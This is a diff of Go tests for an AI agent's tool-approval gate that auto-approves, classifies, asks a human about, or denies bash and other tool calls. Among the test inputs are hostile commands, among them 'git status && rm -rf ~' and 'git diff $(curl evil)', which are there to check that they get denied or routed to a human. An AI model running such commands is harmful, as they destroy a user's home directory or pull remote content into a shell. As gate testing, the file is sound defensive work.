@@ -42,7 +42,7 @@ func bashArgs(cmd string) string {
 func TestAutoMode_SafeReadOnlyBash_AutoApproves(t *testing.T) {
 	for _, cmd := range []string{"ls -la", "git log", "git status && git diff"} {
 		approve, called := newApproveRecorder(false)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if res.IsError {
@@ -62,7 +62,7 @@ func TestAutoMode_SafeReadOnlyBash_AutoApproves(t *testing.T) {
 func TestAutoMode_InertEnvPrefix_AutoApproves(t *testing.T) {
 	for _, cmd := range []string{"CI=1 ls -la", "CGO_ENABLED=0 GOCACHE=/tmp/gc git log", "LC_ALL=C NO_COLOR=1 git log"} {
 		approve, called := newApproveRecorder(false)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if res.IsError {
@@ -93,7 +93,7 @@ func TestAutoMode_PeeledWrappers_AutoApprove(t *testing.T) {
 		"stdbuf -o 0 git status",
 	} {
 		approve, called := newApproveRecorder(false)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if res.IsError {
@@ -133,7 +133,7 @@ func TestAutoMode_WrapperPeelDoesNotLaunder(t *testing.T) {
 		// approve=true so a routed-to-human ask succeeds and is distinguishable
 		// from a silent auto-approve by the recorder flag.
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError && !*called {
@@ -162,7 +162,7 @@ func TestAutoMode_EnvExecHook_DoesNotAutoApprove(t *testing.T) {
 		// approve=true so a routed-to-human ask succeeds and is distinguishable
 		// from a silent auto-approve by the recorder flag.
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError && !*called {
@@ -199,7 +199,7 @@ func TestAutoMode_ToolchainEnvHook_DoesNotAutoApprove(t *testing.T) {
 		// approve=true so a routed-to-human ask succeeds and is distinguishable
 		// from a silent auto-approve by the recorder flag.
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError && !*called {
@@ -243,7 +243,7 @@ func TestAutoMode_ControlFlowDescent_SurfacesHiddenPayload(t *testing.T) {
 		// approve=true so an ask would look like success — only a genuine
 		// terminal deny distinguishes "the payload was seen and refused".
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError {
@@ -266,7 +266,7 @@ func TestAutoMode_FunctionDeclaration_StaysClosed(t *testing.T) {
 		"function f { ls; }",
 	} {
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError && !*called {
@@ -279,7 +279,7 @@ func TestAutoMode_DenySegment_DeniesWithLayerNamedReason(t *testing.T) {
 	approve, called := newApproveRecorder(true)
 	// An allow rule for bash:git * means rules would allow git status, but the
 	// rm -rf segment is dangerous ⇒ terminal deny at the rules layer.
-	g := New(autoCfg(config.AutoConfig{}, []string{"bash:git *"}, nil), newTestRegistry("bash"), approve,
+	g := New(autoCfg(config.AutoConfig{}, []string{"bash:git *"}, nil), newTestRegistry("bash"), Human(approve),
 		WithWorkspaceRoot(t.TempDir()))
 	res := g.Execute(context.Background(), "bash", bashArgs("git status && rm -rf ~"))
 	if !res.IsError {
@@ -319,7 +319,7 @@ func TestAutoMode_GrayArea_RoutesToClassifier(t *testing.T) {
 			// A command that parses cleanly, mutates, but is in-workspace so the
 			// heuristic returns Allow... to force gray-area we use a mutating
 			// command whose path escapes the workspace ⇒ heuristic Ask ⇒ classifier.
-			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 				WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
 			res := g.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes-workspace"))
 			if res.IsError != tc.wantErr {
@@ -339,7 +339,7 @@ func TestAutoMode_Unparseable_AsksNotClassifier(t *testing.T) {
 	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"allow"}`}}
 	cls := newTestClassifier(t, stub)
 	approve, called := newApproveRecorder(true)
-	g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+	g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 		WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
 	res := g.Execute(context.Background(), "bash", bashArgs("git diff $(curl evil)"))
 	if res.IsError {
@@ -357,7 +357,7 @@ func TestAutoMode_NonBashSafeTool_AutoApprovesViaSafeList(t *testing.T) {
 	for _, name := range []string{"read_file", "list_directory", "codeindex_callers"} {
 		approve, called := newApproveRecorder(false)
 		g := New(autoCfg(config.AutoConfig{}, nil, nil),
-			newTestRegistry(name), approve, WithWorkspaceRoot(t.TempDir()))
+			newTestRegistry(name), Human(approve), WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), name, `{}`)
 		if res.IsError {
 			t.Fatalf("non-bash safe tool %q should auto-approve, got: %s", name, res.Output)
@@ -378,7 +378,7 @@ func TestAutoMode_NonBashUnknownTool_RoutesToClassifier(t *testing.T) {
 	cls := newTestClassifier(t, stub)
 	approve, called := newApproveRecorder(true)
 	g := New(autoCfg(config.AutoConfig{}, nil, nil),
-		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
+		newTestRegistry("some_tool"), Human(approve), WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
 	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
 	if !res.IsError {
 		t.Fatalf("non-bash unknown tool with classifier deny should deny, got: %s", res.Output)
@@ -402,7 +402,7 @@ func TestAutoMode_NonBashUnknownTool_RoutesToClassifier(t *testing.T) {
 func TestAutoMode_NonBashUnknownTool_NoClassifier_Asks(t *testing.T) {
 	approve, called := newApproveRecorder(true)
 	g := New(autoCfg(config.AutoConfig{}, nil, nil),
-		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()))
+		newTestRegistry("some_tool"), Human(approve), WithWorkspaceRoot(t.TempDir()))
 	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
 	if res.IsError {
 		t.Fatalf("no classifier should fall closed to human ask (approve=true), got: %s", res.Output)
@@ -417,7 +417,7 @@ func TestAutoMode_CloneForChild_PreservesModeAndClassifier(t *testing.T) {
 	cls := newTestClassifier(t, stub)
 	approve, parentCalled := newApproveRecorder(true)
 	parent := New(autoCfg(config.AutoConfig{}, nil, nil),
-		newTestRegistry("bash"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
+		newTestRegistry("bash"), Human(approve), WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
 
 	child := parent.CloneForChild("worker")
 
@@ -628,7 +628,7 @@ func TestAutoMode_DockerReadOnly_AutoApproves(t *testing.T) {
 		"cd " + root + " && docker compose config --quiet 2>&1; echo done",
 	} {
 		approve, called := newApproveRecorder(false)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(root))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if res.IsError {
@@ -657,7 +657,7 @@ func TestAutoMode_DockerMutating_NeverAutoApproves(t *testing.T) {
 		"docker inspect $C",
 	} {
 		approve, called := newApproveRecorder(true)
-		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve),
 			WithWorkspaceRoot(t.TempDir()))
 		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
 		if !res.IsError && !*called {
@@ -673,7 +673,7 @@ func TestAutoMode_DockerMutating_NeverAutoApproves(t *testing.T) {
 func TestAutoMode_DockerDenyPatternNowReachable(t *testing.T) {
 	approve, called := newApproveRecorder(true)
 	g := New(autoCfg(config.AutoConfig{Deny: []string{"bash:docker *"}}, nil, nil),
-		newTestRegistry("bash"), approve, WithWorkspaceRoot(t.TempDir()))
+		newTestRegistry("bash"), Human(approve), WithWorkspaceRoot(t.TempDir()))
 	res := g.Execute(context.Background(), "bash", bashArgs("docker ps"))
 	if !res.IsError {
 		t.Fatalf("configured deny bash:docker * must be terminal, got success")
@@ -688,8 +688,8 @@ func TestAutoMode_DockerDenyPatternNowReachable(t *testing.T) {
 // auto-approved) when only a policy stand-in answers approvals.
 func TestAutoMode_ExplicitAsk_HumanPrompts(t *testing.T) {
 	approve, called := newApproveRecorder(true)
-	g := New(autoCfg(config.AutoConfig{Ask: []string{"bash:cat*"}}, nil, nil), newTestRegistry("bash"), approve,
-		WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByHuman))
+	g := New(autoCfg(config.AutoConfig{Ask: []string{"bash:cat*"}}, nil, nil), newTestRegistry("bash"), Human(approve),
+		WithWorkspaceRoot(t.TempDir()))
 	res := g.Execute(context.Background(), "bash", bashArgs("cat x.txt"))
 	if !*called {
 		t.Fatalf("explicit ask with a human bound must prompt (safelist must not win); res=%+v", res)
@@ -698,8 +698,8 @@ func TestAutoMode_ExplicitAsk_HumanPrompts(t *testing.T) {
 
 func TestAutoMode_ExplicitAsk_AlwaysPromptHumanPrompts(t *testing.T) {
 	approve, called := newApproveRecorder(true)
-	g := New(autoCfg(config.AutoConfig{}, nil, []string{"bash:cat*"}), newTestRegistry("bash"), approve,
-		WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByHuman))
+	g := New(autoCfg(config.AutoConfig{}, nil, []string{"bash:cat*"}), newTestRegistry("bash"), Human(approve),
+		WithWorkspaceRoot(t.TempDir()))
 	g.Execute(context.Background(), "bash", bashArgs("cat x.txt"))
 	if !*called {
 		t.Fatal("always_prompt match must prompt a human")
@@ -719,7 +719,7 @@ func TestAutoMode_ExplicitAsk_PolicyStandInDenies(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			ctx, rec := recordDecisions()
 			g := New(autoCfg(tc.auto, nil, tc.ap), newTestRegistry("bash"), AlwaysApprove,
-				WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByPolicy))
+				WithWorkspaceRoot(t.TempDir()))
 			res := g.Execute(ctx, "bash", bashArgs("cat x.txt"))
 			if !res.IsError || !res.Denied {
 				t.Fatalf("explicit ask under a policy stand-in must deny; res=%+v", res)
@@ -743,7 +743,7 @@ func TestAutoMode_ExplicitAsk_PolicyStandInDenies(t *testing.T) {
 // No rule matched is unchanged: a policy-allowed headless gate still allows.
 func TestAutoMode_NoRuleMatched_PolicyStillAllows(t *testing.T) {
 	g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), AlwaysApprove,
-		WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByPolicy))
+		WithWorkspaceRoot(t.TempDir()))
 	res := g.Execute(context.Background(), "bash", bashArgs("cat x.txt"))
 	if res.IsError && res.Denied {
 		t.Fatalf("no-rule-matched must keep its old path; res=%+v", res)
@@ -766,8 +766,8 @@ func TestEvalRules_ExplicitAskMatchesAcrossSlashes(t *testing.T) {
 
 func TestAutoMode_ExplicitAsk_SlashArg(t *testing.T) {
 	approve, called := newApproveRecorder(true)
-	g := New(autoCfg(config.AutoConfig{Ask: []string{"bash:cat*"}}, nil, nil), newTestRegistry("bash"), approve,
-		WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByHuman))
+	g := New(autoCfg(config.AutoConfig{Ask: []string{"bash:cat*"}}, nil, nil), newTestRegistry("bash"), Human(approve),
+		WithWorkspaceRoot(t.TempDir()))
 	g.Execute(context.Background(), "bash", bashArgs("cat dir/file"))
 	if !*called {
 		t.Fatal("ask bash:cat* must prompt for cat dir/file")
@@ -786,7 +786,7 @@ func TestAutoMode_ExplicitAsk_SlashArgPolicyDenies(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			ctx, rec := recordDecisions()
 			g := New(autoCfg(tc.auto, nil, tc.ap), newTestRegistry("bash"), AlwaysApprove,
-				WithWorkspaceRoot(t.TempDir()), WithApprovalProvenance(DecidedByPolicy))
+				WithWorkspaceRoot(t.TempDir()))
 			res := g.Execute(ctx, "bash", bashArgs("cat dir/file"))
 			if !res.IsError || !res.Denied || !strings.Contains(res.Output, "bash:cat*") {
 				t.Fatalf("want policy deny naming pattern; res=%+v", res)
